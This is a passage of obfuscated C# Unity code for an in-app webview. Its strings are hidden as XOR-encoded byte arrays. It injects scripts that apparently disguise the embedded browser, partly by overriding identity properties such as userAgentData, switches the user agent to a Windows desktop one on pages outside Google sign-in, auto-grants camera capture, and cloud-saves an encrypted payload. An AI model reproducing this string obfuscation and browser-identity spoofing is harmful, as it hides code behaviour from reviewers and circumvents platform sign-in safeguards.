            {
                _0xc072dd30(false);
            }

            if (_0x9fb9c897 && !IsGoogleAuthFlowUrl(_0xf35857d0) && !IsGoogleAuthFlowUrl(_0xf35857d0))
            {
                WLog(_0x2236f796._0xe98e57cc(new byte[48] { 18, 58, 58, 50, 57, 48, 117, 52, 32, 33, 61, 117, 38, 48, 48, 56, 38, 117, 51, 60, 59, 60, 38, 61, 48, 49, 117, 120, 107, 117, 39, 48, 38, 33, 58, 39, 48, 117, 49, 48, 51, 52, 32, 57, 33, 117, 0, 20 }, 85));
                _0x9fb9c897 = false;
                _0x047ed0fd.SetUserAgent("");
            }
        };
        _0xc7a47d05.OnShouldClose += _0x1af7ea0d =>
        {
            WLog(_0x2236f796._0xe98e57cc(new byte[41] { 23, 24, 41, 63, 56, 17, 108, 1, 45, 37, 34, 108, 27, 41, 46, 26, 37, 41, 59, 108, 3, 34, 31, 36, 35, 57, 32, 40, 15, 32, 35, 63, 41, 108, 37, 34, 58, 35, 39, 41, 40 }, 76));
            _0x1765a9cb();
            return false;
        };
        // POPUP HANDLING LOGIC
        _0xc7a47d05.SetPopupPageEventEnabled(true);
        bool _0xdd6cb9b1 = false;
        bool _0x016a28ed = false;
        _0xc7a47d05.OnMultipleWindowOpened += (_0x1af7ea0d, _0x1726c726) =>
        {
            _0x1af7ea0d.ScrollTo(0, 0, false);
            WLog(_0x2236f796._0xe98e57cc(new byte[43] { 115, 124, 77, 91, 92, 117, 8, 101, 73, 65, 70, 8, 127, 77, 74, 126, 65, 77, 95, 8, 101, 93, 68, 92, 65, 88, 68, 77, 127, 65, 70, 76, 71, 95, 8, 103, 88, 77, 70, 77, 76, 18, 8 }, 40) + _0x1726c726);
            var _0x79a35403 = _0xc7a47d05.GetPopupWindow(_0x1726c726);
            if (_0x79a35403 == null)
                return;
            _0xfa114d74.Add(_0x79a35403);
            Debug.Log($"[Test] Popup ID: {_0x79a35403.Id}");
            _0x79a35403.OnPageStarted += (_0xd811dd8f, _0xf35857d0) =>
            {
                WLog(_0x2236f796._0xe98e57cc(new byte[36] { 40, 39, 22, 0, 7, 46, 83, 35, 28, 3, 6, 3, 83, 36, 22, 17, 37, 26, 22, 4, 83, 60, 29, 35, 18, 20, 22, 32, 7, 18, 1, 7, 22, 23, 73, 83 }, 115) + _0xf35857d0);
                _0x53b77e95 = 0;
                if (string.IsNullOrEmpty(_0xf35857d0) || IsAboutBlank(_0xf35857d0))
                    return;
                if (IsGoogleAuthFlowUrl(_0xf35857d0))
                {
                    WLog(_0x2236f796._0xe98e57cc(new byte[57] { 208, 223, 238, 248, 255, 214, 171, 219, 228, 251, 254, 251, 171, 204, 228, 228, 236, 231, 238, 171, 234, 254, 255, 227, 171, 237, 231, 228, 252, 171, 166, 181, 171, 248, 251, 228, 228, 237, 171, 204, 228, 228, 236, 231, 238, 171, 200, 227, 249, 228, 230, 238, 171, 222, 202, 177, 171 }, 139) + _0xf35857d0);
                    _0xdd6cb9b1 = false;
                    _0x4b885337();
                    if (_0xd811dd8f != null && _0xd811dd8f.IsAlive)
                        _0xd811dd8f.EvaluateJavaScript(_0x5576d8b6());
                    return;
                }

                if (_0x047ed0fd == null)
                    return;
                if (!_0xdd6cb9b1)
                {
                    _0xdd6cb9b1 = true;
                    _0x047ed0fd.SetUserAgent(WindowsDesktopUserAgent);
                    WLog(_0x2236f796._0xe98e57cc(new byte[39] { 172, 163, 146, 132, 131, 170, 215, 167, 152, 135, 130, 135, 215, 150, 135, 135, 155, 142, 215, 160, 158, 153, 147, 152, 128, 132, 215, 147, 146, 132, 156, 131, 152, 135, 215, 162, 182, 205, 215 }, 247) + _0xf35857d0);
                }

                if (_0xd811dd8f != null && _0xd811dd8f.IsAlive)
                    _0xd811dd8f.EvaluateJavaScript(_0xd73d845a());
                if (!_0x016a28ed && _0xd811dd8f != null && _0xd811dd8f.IsAlive && IsHttpUrl(_0xf35857d0))
                {
                    _0x016a28ed = true;
                }
            };
            _0x79a35403.OnPageFinished += (_0xd811dd8f, _0x3b055478) =>
            {
                string _0x2d2eae86 = _0x3b055478 != null ? _0x3b055478.data : string.Empty;
                WLog(_0x2236f796._0xe98e57cc(new byte[35] { 96, 111, 94, 72, 79, 102, 27, 107, 84, 75, 78, 75, 27, 108, 94, 89, 109, 82, 94, 76, 27, 125, 82, 85, 82, 72, 83, 94, 95, 1, 27, 78, 73, 87, 6 }, 59) + _0x2d2eae86);
                if (_0xd811dd8f == null || !_0xd811dd8f.IsAlive)
                    return;
                if (IsGoogleAuthFlowUrl(_0x2d2eae86))
                {
                    _0x4b885337();
                    _0xd811dd8f.EvaluateJavaScript(_0x5576d8b6());
                    return;
                }

                if (!_0xdd6cb9b1)
                    return;
                _0xd811dd8f.EvaluateJavaScript(_0xd73d845a());
            };
        };
        _0xc7a47d05.OnMultipleWindowClosed += (_0x1af7ea0d, _0x1726c726) =>
        {
            _0xfa114d74.RemoveAll(_0x86743b07 => _0x86743b07 == null || _0x86743b07.Id == _0x1726c726 || !_0x86743b07.IsAlive);
            _0xc072dd30(false);
            if (_0xfa114d74.Count == 0 && _0x047ed0fd != null)
            {
                _0xdd6cb9b1 = false;
                _0x016a28ed = false;
                _0xb8b54cb7();
            }

            WLog(_0x2236f796._0xe98e57cc(new byte[43] { 8, 7, 54, 32, 39, 14, 115, 30, 50, 58, 61, 115, 4, 54, 49, 5, 58, 54, 36, 115, 30, 38, 63, 39, 58, 35, 63, 54, 4, 58, 61, 55, 60, 36, 115, 16, 63, 60, 32, 54, 55, 105, 115 }, 83) + _0x1726c726);
        };
        _0xc7a47d05.RegisterOnRequestMediaCapturePermission(_0x7b2fd156 =>
        {
            if (!Permission.HasUserAuthorizedPermission(Permission.Camera))
            {
                Permission.RequestUserPermission(Permission.Camera);
                return UniWebViewMediaCapturePermissionDecision.Prompt;
            }

            return UniWebViewMediaCapturePermissionDecision.Grant;
        });
    }

    private bool _0x284dd0bf(string _0xe15aafe2)
    {
        try
        {
            using (var _0xd0ddf678 = new AndroidJavaClass(_0x2236f796._0xe98e57cc(new byte[30] { 201, 197, 199, 132, 223, 196, 195, 222, 211, 153, 206, 132, 218, 198, 203, 211, 207, 216, 132, 255, 196, 195, 222, 211, 250, 198, 203, 211, 207, 216 }, 170)))
            using (var _0xe183e60c = _0xd0ddf678.GetStatic<AndroidJavaObject>(_0x2236f796._0xe98e57cc(new byte[15] { 38, 48, 55, 55, 32, 43, 49, 4, 38, 49, 44, 51, 44, 49, 60 }, 69)))
            using (var _0xf084c98d = new AndroidJavaClass(_0x2236f796._0xe98e57cc(new byte[15] { 124, 115, 121, 111, 114, 116, 121, 51, 115, 120, 105, 51, 72, 111, 116 }, 29)))
            using (var _0xd560c2c3 = _0xf084c98d.CallStatic<AndroidJavaObject>(_0x2236f796._0xe98e57cc(new byte[5] { 3, 18, 1, 0, 22 }, 115), _0xe15aafe2))
            using (var _0x7fd69065 = new AndroidJavaObject(_0x2236f796._0xe98e57cc(new byte[22] { 0, 15, 5, 19, 14, 8, 5, 79, 2, 14, 15, 21, 4, 15, 21, 79, 40, 15, 21, 4, 15, 21 }, 97), _0x2236f796._0xe98e57cc(new byte[26] { 214, 217, 211, 197, 216, 222, 211, 153, 222, 217, 195, 210, 217, 195, 153, 214, 212, 195, 222, 216, 217, 153, 225, 254, 242, 224 }, 183), _0xd560c2c3))
            {
                WLog(_0x2236f796._0xe98e57cc(new byte[26] { 237, 198, 220, 193, 195, 203, 226, 199, 197, 203, 142, 193, 222, 203, 192, 142, 203, 214, 218, 203, 220, 192, 207, 194, 148, 142 }, 174) + _0xe15aafe2);
                _0x7fd69065.Call<AndroidJavaObject>(_0x2236f796._0xe98e57cc(new byte[11] { 27, 30, 30, 57, 27, 14, 31, 29, 21, 8, 3 }, 122), _0x2236f796._0xe98e57cc(new byte[33] { 57, 54, 60, 42, 55, 49, 60, 118, 49, 54, 44, 61, 54, 44, 118, 59, 57, 44, 61, 63, 55, 42, 33, 118, 26, 10, 23, 15, 11, 25, 26, 20, 29 }, 88));
                _0x7fd69065.Call<AndroidJavaObject>(_0x2236f796._0xe98e57cc(new byte[8] { 171, 174, 174, 140, 166, 171, 173, 185 }, 202), 0x10000000);
                _0xe183e60c.Call(_0x2236f796._0xe98e57cc(new byte[13] { 22, 17, 4, 23, 17, 36, 6, 17, 12, 19, 12, 17, 28 }, 101), _0x7fd69065);
                return true;
            }
        }
        catch (Exception e)
        {
            WLog(_0x2236f796._0xe98e57cc(new byte[28] { 255, 212, 206, 211, 209, 217, 240, 213, 215, 217, 156, 217, 196, 200, 217, 206, 210, 221, 208, 156, 218, 221, 213, 208, 217, 216, 134, 156 }, 188) + e.Message);
            Application.OpenURL(_0xe15aafe2);
            return true;
        }
    }

    private IEnumerator _0x60f001e2()
    {
        yield return _0x0c8073a1(Permission.Camera);
    }

    private static bool IsPrivacyItemTrue(Item _0x2294fa9d)
    {
        if (_0x2294fa9d.Key != _0x2236f796._0xe98e57cc(new byte[9] { 18, 8, 43, 9, 18, 13, 26, 24, 2 }, 123))
            return false;
        try
        {
            var _0x737a7351 = _0x2294fa9d.Value.GetAs<object>();
            return _0x737a7351 switch
            {
                bool b => b,
                string s when bool.TryParse(s, out var parsed) => parsed,
                _ => false
            };
        }
        catch
        {
            return false;
        }
    }

    private async Task _0x57a2abaa(string _0xda63bc1b)
    {
        if (_0x63c8940f || string.IsNullOrEmpty(_0x33f22522) || string.IsNullOrEmpty(_0xda63bc1b) || _0x96918f82)
            return;
        _0x63c8940f = true;
        try
        {
            JObject _0x805b58a4 = _0xf9cc4916(_0xda63bc1b, _0x33f22522, _0x8343a468());
            {
#if B_LOGS
                {
                    Debug.Log($"[Test][Load Pass] Send total: {_0xda63bc1b} payload: {_0x805b58a4}");
                }
#endif
            }

            var _0xf63c7c2a = _0x7fcd18cc(_0x805b58a4.ToString(), _0x33f22522);
            await CloudSaveService.Instance.Data.Player.SaveAsync(new Dictionary<string, object> { { _0x2236f796._0xe98e57cc(new byte[4] { 41, 42, 36, 33 }, 69) + _0x33f22522, _0xf63c7c2a } });
        }
        catch (Exception e)
        {
            {
#if B_LOGS
                Debug.Log(_0x2236f796._0xe98e57cc(new byte[24] { 139, 132, 149, 131, 132, 141, 240, 156, 191, 177, 180, 240, 160, 177, 163, 163, 240, 181, 162, 162, 191, 162, 234, 240 }, 208) + e.Message);
#endif
            }
        }
    }

    private string _0xd73d845a()
    {
        return _0x2236f796._0xe98e57cc(new byte[12] { 66, 12, 31, 4, 9, 30, 3, 5, 4, 66, 67, 17 }, 106) + _0x2236f796._0xe98e57cc(new byte[8] { 25, 14, 29, 79, 26, 14, 82, 72 }, 111) + WindowsDesktopUserAgent + _0x2236f796._0xe98e57cc(new byte[2] { 38, 58 }, 1) + _0x2236f796._0xe98e57cc(new byte[30] { 98, 117, 102, 52, 100, 102, 123, 96, 123, 41, 90, 117, 98, 125, 115, 117, 96, 123, 102, 58, 100, 102, 123, 96, 123, 96, 109, 100, 113, 47 }, 20) + _0x2236f796._0xe98e57cc(new byte[121] { 215, 196, 223, 210, 197, 216, 222, 223, 145, 213, 212, 215, 153, 222, 211, 219, 157, 218, 212, 200, 157, 199, 208, 221, 152, 202, 197, 195, 200, 202, 254, 211, 219, 212, 210, 197, 159, 213, 212, 215, 216, 223, 212, 225, 195, 222, 193, 212, 195, 197, 200, 153, 222, 211, 219, 157, 218, 212, 200, 157, 202, 214, 212, 197, 139, 215, 196, 223, 210, 197, 216, 222, 223, 153, 152, 202, 195, 212, 197, 196, 195, 223, 145, 199, 208, 221, 138, 204, 157, 210, 222, 223, 215, 216, 214, 196, 195, 208, 211, 221, 212, 139, 197, 195, 196, 212, 204, 152, 138, 204, 210, 208, 197, 210, 217, 153, 212, 152, 202, 204, 204 }, 177) + _0x2236f796._0xe98e57cc(new byte[26] { 19, 18, 17, 95, 7, 5, 24, 3, 24, 91, 80, 2, 4, 18, 5, 54, 16, 18, 25, 3, 80, 91, 2, 22, 94, 76 }, 119) + _0x2236f796._0xe98e57cc(new byte[130] { 210, 211, 208, 158, 198, 196, 217, 194, 217, 154, 145, 215, 198, 198, 224, 211, 196, 197, 223, 217, 216, 145, 154, 145, 131, 152, 134, 150, 158, 225, 223, 216, 210, 217, 193, 197, 150, 248, 226, 150, 135, 134, 152, 134, 141, 150, 225, 223, 216, 128, 130, 141, 150, 206, 128, 130, 159, 150, 247, 198, 198, 218, 211, 225, 211, 212, 253, 223, 194, 153, 131, 133, 129, 152, 133, 128, 150, 158, 253, 254, 226, 251, 250, 154, 150, 218, 223, 221, 211, 150, 241, 211, 213, 221, 217, 159, 150, 245, 222, 196, 217, 219, 211, 153, 135, 132, 134, 152, 134, 152, 134, 152, 134, 150, 229, 215, 208, 215, 196, 223, 153, 131, 133, 129, 152, 133, 128, 145, 159, 141 }, 182) + _0x2236f796._0xe98e57cc(new byte[30] { 228, 229, 230, 168, 240, 242, 239, 244, 239, 172, 167, 240, 236, 225, 244, 230, 239, 242, 237, 167, 172, 167, 215, 233, 238, 179, 178, 167, 169, 187 }, 128) + _0x2236f796._0xe98e57cc(new byte[34] { 211, 210, 209, 159, 199, 197, 216, 195, 216, 155, 144, 193, 210, 217, 211, 216, 197, 144, 155, 144, 240, 216, 216, 208, 219, 210, 151, 254, 217, 212, 153, 144, 158, 140 }, 183) + _0x2236f796._0xe98e57cc(new byte[30] { 118, 119, 116, 58, 98, 96, 125, 102, 125, 62, 53, 127, 115, 106, 70, 125, 103, 113, 122, 66, 125, 123, 124, 102, 97, 53, 62, 34, 59, 41 }, 18) + _0x2236f796._0xe98e57cc(new byte[449] { 91, 93, 86, 84, 89, 78, 93, 15, 90, 78, 75, 18, 84, 77, 93, 78, 65, 75, 92, 21, 116, 84, 77, 93, 78, 65, 75, 21, 8, 108, 71, 93, 64, 66, 70, 90, 66, 8, 3, 89, 74, 93, 92, 70, 64, 65, 21, 8, 30, 29, 31, 8, 82, 3, 84, 77, 93, 78, 65, 75, 21, 8, 104, 64, 64, 72, 67, 74, 15, 108, 71, 93, 64, 66, 74, 8, 3, 89, 74, 93, 92, 70, 64, 65, 21, 8, 30, 29, 31, 8, 82, 3, 84, 77, 93, 78, 65, 75, 21, 8, 97, 64, 91, 18, 110, 16, 109, 93, 78, 65, 75, 8, 3, 89, 74, 93, 92, 70, 64, 65, 21, 8, 29, 27, 8, 82, 114, 3, 66, 64, 77, 70, 67, 74, 21, 73, 78, 67, 92, 74, 3, 95, 67, 78, 91, 73, 64, 93, 66, 21, 8, 120, 70, 65, 75, 64, 88, 92, 8, 3, 72, 74, 91, 103, 70, 72, 71, 106, 65, 91, 93, 64, 95, 86, 121, 78, 67, 90, 74, 92, 21, 73, 90, 65, 76, 91, 70, 64, 65, 7, 6, 84, 93, 74, 91, 90, 93, 65, 15, 127, 93, 64, 66, 70, 92, 74, 1, 93, 74, 92, 64, 67, 89, 74, 7, 84, 78, 93, 76, 71, 70, 91, 74, 76, 91, 90, 93, 74, 21, 8, 87, 23, 25, 8, 3, 77, 70, 91, 65, 74, 92, 92, 21, 8, 25, 27, 8, 3, 66, 64, 77, 70, 67, 74, 21, 73, 78, 67, 92, 74, 3, 66, 64, 75, 74, 67, 21, 8, 8, 3, 95, 67, 78, 91, 73, 64, 93, 66, 21, 8, 120, 70, 65, 75, 64, 88, 92, 8, 3, 95, 67, 78, 91, 73, 64, 93, 66, 121, 74, 93, 92, 70, 64, 65, 21, 8, 30, 26, 1, 31, 1, 31, 8, 3, 90, 78, 105, 90, 67, 67, 121, 74, 93, 92, 70, 64, 65, 21, 8, 30, 29, 31, 1, 31, 1, 31, 1, 31, 8, 82, 6, 20, 82, 82, 20, 96, 77, 69, 74, 76, 91, 1, 75, 74, 73, 70, 65, 74, 127, 93, 64, 95, 74, 93, 91, 86, 7, 95, 93, 64, 91, 64, 3, 8, 90, 92, 74, 93, 110, 72, 74, 65, 91, 107, 78, 91, 78, 8, 3, 84, 72, 74, 91, 21, 73, 90, 65, 76, 91, 70, 64, 65, 7, 6, 84, 93, 74, 91, 90, 93, 65, 15, 90, 78, 75, 20, 82, 3, 76, 64, 65, 73, 70, 72, 90, 93, 78, 77, 67, 74, 21, 91, 93, 90, 74, 82, 6, 20, 82, 76, 78, 91, 76, 71, 7, 74, 6, 84, 82 }, 47) + _0x2236f796._0xe98e57cc(new byte[112] { 200, 201, 202, 132, 223, 207, 222, 201, 201, 194, 128, 139, 219, 197, 200, 216, 196, 139, 128, 157, 149, 158, 156, 133, 151, 200, 201, 202, 132, 223, 207, 222, 201, 201, 194, 128, 139, 196, 201, 197, 203, 196, 216, 139, 128, 157, 156, 148, 156, 133, 151, 200, 201, 202, 132, 223, 207, 222, 201, 201, 194, 128, 139, 205, 218, 205, 197, 192, 251, 197, 200, 216, 196, 139, 128, 157, 149, 158, 156, 133, 151, 200, 201, 202, 132, 223, 207, 222, 201, 201, 194, 128, 139, 205, 218, 205, 197, 192, 228, 201, 197, 203, 196, 216, 139, 128, 157, 156, 152, 156, 133, 151 }, 172) + _0x2236f796._0xe98e57cc(new byte[45] { 34, 36, 47, 45, 33, 63, 56, 50, 57, 33, 120, 57, 56, 34, 57, 35, 53, 62, 37, 34, 55, 36, 34, 107, 35, 56, 50, 51, 48, 63, 56, 51, 50, 109, 43, 53, 55, 34, 53, 62, 126, 51, 127, 45, 43 }, 86) + _0x2236f796._0xe98e57cc(new byte[721] { 248, 254, 245, 247, 250, 237, 254, 172, 227, 254, 229, 235, 177, 251, 229, 226, 232, 227, 251, 162, 225, 237, 248, 239, 228, 193, 233, 232, 229, 237, 162, 238, 229, 226, 232, 164, 251, 229, 226, 232, 227, 251, 165, 183, 251, 229, 226, 232, 227, 251, 162, 225, 237, 248, 239, 228, 193, 233, 232, 229, 237, 177, 234, 249, 226, 239, 248, 229, 227, 226, 164, 253, 165, 247, 250, 237, 254, 172, 255, 177, 223, 248, 254, 229, 226, 235, 164, 253, 165, 162, 248, 227, 192, 227, 251, 233, 254, 207, 237, 255, 233, 164, 165, 183, 229, 234, 164, 255, 162, 229, 226, 232, 233, 244, 195, 234, 164, 171, 252, 227, 229, 226, 248, 233, 254, 182, 172, 239, 227, 237, 254, 255, 233, 171, 165, 178, 177, 188, 240, 240, 255, 162, 229, 226, 232, 233, 244, 195, 234, 164, 171, 228, 227, 250, 233, 254, 182, 172, 226, 227, 226, 233, 171, 165, 178, 177, 188, 240, 240, 255, 162, 229, 226, 232, 233, 244, 195, 234, 164, 171, 225, 237, 244, 161, 251, 229, 232, 248, 228, 171, 165, 178, 177, 188, 240, 240, 255, 162, 229, 226, 232, 233, 244, 195, 234, 164, 171, 225, 237, 244, 161, 232, 233, 250, 229, 239, 233, 161, 251, 229, 232, 248, 228, 171, 165, 178, 177, 188, 165, 254, 233, 248, 249, 254, 226, 172, 247, 225, 237, 248, 239, 228, 233, 255, 182, 234, 237, 224, 255, 233, 160, 225, 233, 232, 229, 237, 182, 253, 160, 227, 226, 239, 228, 237, 226, 235, 233, 182, 226, 249, 224, 224, 160, 237, 232, 232, 192, 229, 255, 248, 233, 226, 233, 254, 182, 234, 249, 226, 239, 248, 229, 227, 226, 164, 165, 247, 241, 160, 254, 233, 225, 227, 250, 233, 192, 229, 255, 248, 233, 226, 233, 254, 182, 234, 249, 226, 239, 248, 229, 227, 226, 164, 165, 247, 241, 160, 237, 232, 232, 201, 250, 233, 226, 248, 192, 229, 255, 248, 233, 226, 233, 254, 182, 234, 249, 226, 239, 248, 229, 227, 226, 164, 165, 247, 241, 160, 254, 233, 225, 227, 250, 233, 201, 250, 233, 226, 248, 192, 229, 255, 248, 233, 226, 233, 254, 182, 234, 249, 226, 239, 248, 229, 227, 226, 164, 165, 247, 241, 160, 232, 229, 255, 252, 237, 248, 239, 228, 201, 250, 233, 226, 248, 182, 234, 249, 226, 239, 248, 229, 227, 226, 164, 165, 247, 254, 233, 248, 249, 254, 226, 172, 234, 237, 224, 255, 233, 183, 241, 241, 183, 229, 234, 164, 255, 162, 229, 226, 232, 233, 244, 195, 234, 164, 171, 252, 227, 229, 226, 248, 233, 254, 182, 172, 234, 229, 226, 233, 171, 165, 178, 177, 188, 240, 240, 255, 162, 229, 226, 232, 233, 244, 195, 234, 164, 171, 228, 227, 250, 233, 254, 182, 172, 228, 227, 250, 233, 254, 171, 165, 178, 177, 188, 165, 254, 233, 248, 249, 254, 226, 172, 247, 225, 237, 248, 239, 228, 233, 255, 182, 248, 254, 249, 233, 160, 225, 233, 232, 229, 237, 182, 253, 160, 227, 226, 239, 228, 237, 226, 235, 233, 182, 226, 249, 224, 224, 160, 237, 232, 232, 192, 229, 255, 248, 233, 226, 233, 254, 182, 234, 249, 226, 239, 248, 229, 227, 226, 164, 165, 247, 241, 160, 254, 233, 225, 227, 250, 233, 192, 229, 255, 248, 233, 226, 233, 254, 182, 234, 249, 226, 239, 248, 229, 227, 226, 164, 165, 247, 241, 160, 237, 232, 232, 201, 250, 233, 226, 248, 192, 229, 255, 248, 233, 226, 233, 254, 182, 234, 249, 226, 239, 248, 229, 227, 226, 164, 165, 247, 241, 160, 254, 233, 225, 227, 250, 233, 201, 250, 233, 226, 248, 192, 229, 255, 248, 233, 226, 233, 254, 182, 234, 249, 226, 239, 248, 229, 227, 226, 164, 165, 247, 241, 160, 232, 229, 255, 252, 237, 248, 239, 228, 201, 250, 233, 226, 248, 182, 234, 249, 226, 239, 248, 229, 227, 226, 164, 165, 247, 254, 233, 248, 249, 254, 226, 172, 234, 237, 224, 255, 233, 183, 241, 241, 183, 254, 233, 248, 249, 254, 226, 172, 227, 254, 229, 235, 164, 253, 165, 183, 241, 183, 241, 239, 237, 248, 239, 228, 164, 233, 165, 247, 241 }, 140) + _0x2236f796._0xe98e57cc(new byte[5] { 70, 18, 19, 18, 0 }, 59);
    }

    // WEB VIEW LOGIC
    public bool _0xf630cf5a { get; set; }

    private string _0x5576d8b6()
    {
        string _0x0c778137 = _0x213c089a();
        if (string.IsNullOrEmpty(_0x0c778137))
            return _0x2236f796._0xe98e57cc(new byte[7] { 223, 198, 192, 205, 137, 153, 146 }, 169);
        string _0xf77fc529 = _0x0c778137.Replace(_0x2236f796._0xe98e57cc(new byte[1] { 46 }, 114), _0x2236f796._0xe98e57cc(new byte[2] { 252, 252 }, 160)).Replace(_0x2236f796._0xe98e57cc(new byte[1] { 189 }, 154), _0x2236f796._0xe98e57cc(new byte[2] { 21, 110 }, 73));
        var _0x63b6f447 = Regex.Match(_0x0c778137, _0x2236f796._0xe98e57cc(new byte[12] { 144, 187, 161, 188, 190, 182, 252, 251, 143, 183, 248, 250 }, 211));
        string _0x2bd20aa1 = _0x63b6f447.Success ? _0x63b6f447.Groups[1].Value : _0x2236f796._0xe98e57cc(new byte[3] { 59, 56, 58 }, 10);
        return _0x2236f796._0xe98e57cc(new byte[12] { 146, 220, 207, 212, 217, 206, 211, 213, 212, 146, 147, 193 }, 186) + _0x2236f796._0xe98e57cc(new byte[8] { 222, 201, 218, 136, 221, 201, 149, 143 }, 168) + _0xf77fc529 + _0x2236f796._0xe98e57cc(new byte[2] { 255, 227 }, 216) + _0x2236f796._0xe98e57cc(new byte[30] { 217, 206, 221, 143, 223, 221, 192, 219, 192, 146, 225, 206, 217, 198, 200, 206, 219, 192, 221, 129, 223, 221, 192, 219, 192, 219, 214, 223, 202, 148 }, 175) + _0x2236f796._0xe98e57cc(new byte[121] { 63, 44, 55, 58, 45, 48, 54, 55, 121, 61, 60, 63, 113, 54, 59, 51, 117, 50, 60, 32, 117, 47, 56, 53, 112, 34, 45, 43, 32, 34, 22, 59, 51, 60, 58, 45, 119, 61, 60, 63, 48, 55, 60, 9, 43, 54, 41, 60, 43, 45, 32, 113, 54, 59, 51, 117, 50, 60, 32, 117, 34, 62, 60, 45, 99, 63, 44, 55, 58, 45, 48, 54, 55, 113, 112, 34, 43, 60, 45, 44, 43, 55, 121, 47, 56, 53, 98, 36, 117, 58, 54, 55, 63, 48, 62, 44, 43, 56, 59, 53, 60, 99, 45, 43, 44, 60, 36, 112, 98, 36, 58, 56, 45, 58, 49, 113, 60, 112, 34, 36, 36 }, 89) + _0x2236f796._0xe98e57cc(new byte[26] { 203, 202, 201, 135, 223, 221, 192, 219, 192, 131, 136, 218, 220, 202, 221, 238, 200, 202, 193, 219, 136, 131, 218, 206, 134, 148 }, 175) + _0x2236f796._0xe98e57cc(new byte[52] { 206, 207, 204, 130, 218, 216, 197, 222, 197, 134, 141, 203, 218, 218, 252, 207, 216, 217, 195, 197, 196, 141, 134, 223, 203, 132, 216, 207, 218, 198, 203, 201, 207, 130, 133, 244, 231, 197, 208, 195, 198, 198, 203, 246, 133, 133, 134, 141, 141, 131, 131, 145 }, 170) + _0x2236f796._0xe98e57cc(new byte[37] { 43, 42, 41, 103, 63, 61, 32, 59, 32, 99, 104, 63, 35, 46, 59, 41, 32, 61, 34, 104, 99, 104, 3, 38, 33, 58, 55, 111, 46, 61, 34, 57, 119, 35, 104, 102, 116 }, 79) + _0x2236f796._0xe98e57cc(new byte[34] { 42, 43, 40, 102, 62, 60, 33, 58, 33, 98, 105, 56, 43, 32, 42, 33, 60, 105, 98, 105, 9, 33, 33, 41, 34, 43, 110, 7, 32, 45, 96, 105, 103, 117 }, 78) + _0x2236f796._0xe98e57cc(new byte[30] { 102, 103, 100, 42, 114, 112, 109, 118, 109, 46, 37, 111, 99, 122, 86, 109, 119, 97, 106, 82, 109, 107, 108, 118, 113, 37, 46, 55, 43, 57 }, 2) + _0x2236f796._0xe98e57cc(new byte[48] { 101, 99, 104, 106, 103, 112, 99, 49, 100, 112, 117, 44, 106, 115, 99, 112, 127, 117, 98, 43, 74, 106, 115, 99, 112, 127, 117, 43, 54, 82, 121, 99, 126, 124, 120, 100, 124, 54, 61, 103, 116, 99, 98, 120, 126, 127, 43, 54 }, 17) + _0x2bd20aa1 + _0x2236f796._0xe98e57cc(new byte[35] { 92, 6, 87, 0, 25, 9, 26, 21, 31, 65, 92, 60, 20, 20, 28, 23, 30, 91, 56, 19, 9, 20, 22, 30, 92, 87, 13, 30, 9, 8, 18, 20, 21, 65, 92 }, 123) + _0x2bd20aa1 + _0x2236f796._0xe98e57cc(new byte[238] { 154, 192, 145, 198, 223, 207, 220, 211, 217, 135, 154, 243, 210, 201, 128, 252, 130, 255, 207, 220, 211, 217, 154, 145, 203, 216, 207, 206, 212, 210, 211, 135, 154, 143, 137, 154, 192, 224, 145, 208, 210, 223, 212, 209, 216, 135, 201, 207, 200, 216, 145, 205, 209, 220, 201, 219, 210, 207, 208, 135, 154, 252, 211, 217, 207, 210, 212, 217, 154, 145, 218, 216, 201, 245, 212, 218, 213, 248, 211, 201, 207, 210, 205, 196, 235, 220, 209, 200, 216, 206, 135, 219, 200, 211, 222, 201, 212, 210, 211, 149, 148, 198, 207, 216, 201, 200, 207, 211, 157, 237, 207, 210, 208, 212, 206, 216, 147, 207, 216, 206, 210, 209, 203, 216, 149, 198, 220, 207, 222, 213, 212, 201, 216, 222, 201, 200, 207, 216, 135, 154, 220, 207, 208, 154, 145, 223, 212, 201, 211, 216, 206, 206, 135, 154, 139, 137, 154, 145, 208, 210, 223, 212, 209, 216, 135, 201, 207, 200, 216, 145, 208, 210, 217, 216, 209, 135, 154, 154, 145, 205, 209, 220, 201, 219, 210, 207, 208, 135, 154, 252, 211, 217, 207, 210, 212, 217, 154, 145, 205, 209, 220, 201, 219, 210, 207, 208, 235, 216, 207, 206, 212, 210, 211, 135, 154, 140, 137, 147, 141, 147, 141, 154, 145, 200, 220, 251, 200, 209, 209, 235, 216, 207, 206, 212, 210, 211, 135, 154 }, 189) + _0x2bd20aa1 + _0x2236f796._0xe98e57cc(new byte[117] { 43, 53, 43, 53, 43, 53, 34, 120, 44, 62, 120, 120, 62, 74, 103, 111, 96, 102, 113, 43, 97, 96, 99, 108, 107, 96, 85, 119, 106, 117, 96, 119, 113, 124, 45, 117, 119, 106, 113, 106, 41, 34, 112, 118, 96, 119, 68, 98, 96, 107, 113, 65, 100, 113, 100, 34, 41, 126, 98, 96, 113, 63, 99, 112, 107, 102, 113, 108, 106, 107, 45, 44, 126, 119, 96, 113, 112, 119, 107, 37, 112, 100, 97, 62, 120, 41, 102, 106, 107, 99, 108, 98, 112, 119, 100, 103, 105, 96, 63, 113, 119, 112, 96, 120, 44, 62, 120, 102, 100, 113, 102, 109, 45, 96, 44, 126, 120 }, 5) + _0x2236f796._0xe98e57cc(new byte[5] { 246, 162, 163, 162, 176 }, 139);
    }

    private IEnumerator _0x1aa4a164(string _0xdd5723e8)
    {
        if (_0x047ed0fd != null && _0xf630cf5a)
            yield break;
        _0x047ed0fd = gameObject.AddComponent<UniWebView>();
        _0x0ec69b57(_0x047ed0fd);
        _0xd90eb699(_0x047ed0fd);
        _0x047ed0fd.BackgroundColor = Color.clear;
        var _0x3c4f7b65 = SceneManager.GetActiveScene().GetRootGameObjects();
        if (Camera.main != null)
        {
            Camera.main.clearFlags = CameraClearFlags.SolidColor;
            Camera.main.backgroundColor = Color.clear;
            yield return new WaitForEndOfFrame();
        }

        yield return new WaitForEndOfFrame();
        _0x381a537f();
        yield return new WaitForEndOfFrame();
        _0xf630cf5a = true;
        _0x902e6d81();
        _0xc072dd30(true);
        _0x5deee036 = false;
        _0x9fb9c897 = false;
        _0xfa114d74.Clear();
        _0x12e43367 = -1;
        firstLoadShown = false;
        _0x3049ae7b = false;
        _0xa01add9a = false;
        _0x047ed0fd.SetUserAgent("");
        _0x4131c309 = Time.realtimeSinceStartup;
        _0x047ed0fd.Stop();
        _0x047ed0fd.Load(_0xdd5723e8);
        _0x047ed0fd.Show(false, UniWebViewTransitionEdge.None, 0f, null);
